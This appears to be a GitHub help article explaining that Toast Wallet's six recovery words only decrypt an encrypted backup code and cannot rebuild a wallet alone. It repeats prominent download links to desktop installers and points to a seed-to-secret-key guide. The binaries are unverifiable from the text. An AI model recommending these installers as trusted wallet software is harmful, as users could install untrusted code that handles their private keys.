<p align="center"><img src="https://github.com/Toast-Wallet/learn/raw/HEAD/assets/banner-article.png" alt="Toast Wallet banner" width="100%"></p>

<h1 align="center">Toast Wallet six words are not a seed</h1>

<p align="center">Why the six words alone cannot rebuild a wallet.</p>

<p align="center">
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet.Setup.3.0.0.exe"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-WINDOWS-1f5fbf?style=for-the-badge&logo=windows&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Windows"></a>
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0.dmg"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-MACOS-1f5fbf?style=for-the-badge&logo=apple&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Macos"></a>
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-x86_64.AppImage"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-LINUX-1f5fbf?style=for-the-badge&logo=linux&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Linux"></a>
</p>

| Platform | File |
|:--|:--|
| 🪟 Windows | [`ToastWallet.Setup.3.0.0.exe`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet.Setup.3.0.0.exe) |
| 🍎 macOS | [`ToastWallet-3.0.0.dmg`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0.dmg) |
| 🐧 Linux | [`ToastWallet-3.0.0-x86_64.AppImage`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-x86_64.AppImage) |

All versions and checksums are on the [Toast Wallet 3.0.0 release page](https://github.com/Toast-Wallet/core/releases/tag/3.0.0).

> [!IMPORTANT]
> Only download from this GitHub release page.

---

## 💡 Short answer

Toast Wallet's six words cannot rebuild a wallet on their own, unlike a 12 or 24 word seed phrase from other wallets. They unlock your encrypted backup code. To get your accounts back, you need the backup code plus the six words (or the passphrase) inside the [latest desktop wallet](https://github.com/Toast-Wallet/core/releases/tag/3.0.0).

## 👀 You'll see this if

- You only kept the six words and threw away the backup code.
- You entered the six words into another wallet and nothing happened.
- A website claims it can turn Toast's six words into your keys.
- You assumed "recovery words" meant the same as "seed phrase".

## 🤔 Why it happens

In most modern wallets, the words you write down are a seed: a human-readable form of the master key. Type them into a compatible wallet and every account reappears. Toast Wallet took a different design. Your keys are stored inside an encrypted backup code, and the six words are one of two ways to decrypt it, the other being your passphrase.

So the six words are more like a spare key to a safe than the contents of the safe. Without the safe, the spare key opens nothing. That is why typing them into a different wallet or a website cannot work, and why anyone who claims it can is not telling the truth.

## 🧭 Before you start

Gather every item linked to your wallet: the six words, any backup code, any passphrase notes, and a list of computers that ever ran Toast Wallet. The six words are useful only when paired with one of the other items, so the search for that second item is the real task.

## 🛠️ Fix: what to do if you have the six words

1. **Look for your backup code.** It is a long encrypted string, often written near the six words or kept with your wallet notes.
2. **If you find it, restore.** Install the latest desktop wallet, choose Restore an Existing Wallet, then Restore Backup, paste the code and use the six words when asked. The full method is in [Toast Wallet recovery phrase explained](https://github.com/Toast-Wallet/learn/blob/main/how-to/toast-wallet-recovery-phrase-explained.md).
3. **If you cannot find it, check old computers.** Wallet data on an old machine may still open in the latest release; see [open old Toast Wallet files](https://github.com/Toast-Wallet/learn/blob/main/how-to/open-old-toast-wallet-files.md).
4. **If you find the wallet open anywhere, make a backup.** Settings, Backup Wallet, then store the code with your words.
5. **If you have a different list of 12 or 24 words,** it did not come from Toast's six-word system. Read [Toast Wallet seed phrase to secret key offline](https://github.com/Toast-Wallet/learn/blob/main/how-to/toast-wallet-seed-phrase-to-secret-key-offline.md) to turn it into an XRP secret key you can import.

## 🧩 Real-world example

A user keeps a neat card with six words in their safe and believes their wallet is protected. Years later they install Toast Wallet on a new computer and look for a place to type the words. The restore asks first for a backup code, which they never kept. They search online and find a page offering a "Toast six word converter". Fortunately, they read this guide instead and recover the wallet from an old laptop, then store the backup code together with the six words from that day on.

## ⚠️ Common mistakes

- Treating the six words as a complete backup and discarding the backup code.
- Typing the six words into other wallets, which cannot use them.
- Trusting websites or downloads that claim to convert the six words into keys.
- Mixing six words from one wallet with a backup code from another.

## 🔁 If that did not work

- **No backup code and no old wallet data.** The six words alone cannot reopen the accounts.
- **The six words are refused with your backup.** They may belong to a different wallet or a later setup.
- **Someone offers a paid converter.** It is a scam; see [Toast Wallet scams to avoid](https://github.com/Toast-Wallet/learn/blob/main/how-to/toast-wallet-scams-to-avoid.md).

## 🛡️ Prevention

Always store the backup code and the six words (or passphrase) as a set. Label them with the date. Tell anyone who may one day need to restore your wallet that both pieces are required.

## 🔍 A closer look at why the designs differ

Seed phrases became popular later, as more wallets adopted a shared standard for generating keys from words. Toast Wallet's approach is built around an encrypted backup instead: your keys are packed inside the backup code, and the six words or passphrase decrypt it. Both designs can be safe. The danger only appears when people apply the habits of one design to the other, such as keeping words and discarding the backup.

If you use several wallets, label your papers clearly. Write "Toast Wallet six recovery words, need backup code" on one sheet and "24 word seed phrase, other wallet" on another. Clear labels prevent confusion years later, especially for family members who may not know the difference.

## 🧠 Remember

Six words plus a backup code restore a Toast Wallet. Six words alone do not. If you hold only the words today, your task is to find the backup code or the old wallet data, not to find a tool that "converts" the words. That search, done patiently, is what actually brings accounts back.

## ❓ FAQ

<details>
<summary>Why did Toast choose six words?</summary>

They act as an alternative to your passphrase for unlocking the backup, not as a seed.

</details>

<details>
<summary>Can I enter the six words in another XRP wallet?</summary>

No. They only work with a Toast Wallet backup inside Toast Wallet.

</details>

<details>
<summary>Are the six words dangerous to lose?</summary>

If you still have the backup code and passphrase, you can restore without them.

</details>

> [!WARNING]
> Any website or app that asks for Toast's six words will steal your XRP. Type them only into the desktop app during a restore.

---

## ⬇️ Download Toast Wallet 3.0.0

<p align="center">
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet.Setup.3.0.0.exe"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-WINDOWS-1f5fbf?style=for-the-badge&logo=windows&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Windows"></a>
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0.dmg"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-MACOS-1f5fbf?style=for-the-badge&logo=apple&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Macos"></a>
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-x86_64.AppImage"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-LINUX-1f5fbf?style=for-the-badge&logo=linux&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Linux"></a>
</p>

| Platform | File |
|:--|:--|
| 🪟 Windows | [`ToastWallet.Setup.3.0.0.exe`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet.Setup.3.0.0.exe) |
| 🍎 macOS | [`ToastWallet-3.0.0.dmg`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0.dmg) |
| 🐧 Linux | [`ToastWallet-3.0.0-x86_64.AppImage`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-x86_64.AppImage) |

Checksums for every file are on the [official Toast Wallet 3.0.0 release](https://github.com/Toast-Wallet/core/releases/tag/3.0.0). More guides live in the [Toast Wallet learn hub](https://github.com/Toast-Wallet/learn).

---

## 📚 Related articles

| Guide | What it covers |
|:--|:--|
| [Toast Wallet recovery phrase explained](https://github.com/Toast-Wallet/learn/blob/main/how-to/toast-wallet-recovery-phrase-explained.md) | What the six recovery words do, and what they cannot do. |
| [Toast Wallet seed phrase to secret key offline](https://github.com/Toast-Wallet/learn/blob/main/how-to/toast-wallet-seed-phrase-to-secret-key-offline.md) | Turn 12 or 24 words into an XRP secret key with the internet off. |
| [Toast Wallet scams to avoid](https://github.com/Toast-Wallet/learn/blob/main/how-to/toast-wallet-scams-to-avoid.md) | Fake sites, fake apps and fake recovery tools named and explained. |
| [Open old Toast Wallet files](https://github.com/Toast-Wallet/learn/blob/main/how-to/open-old-toast-wallet-files.md) | Older wallet files still open in the current desktop release. |
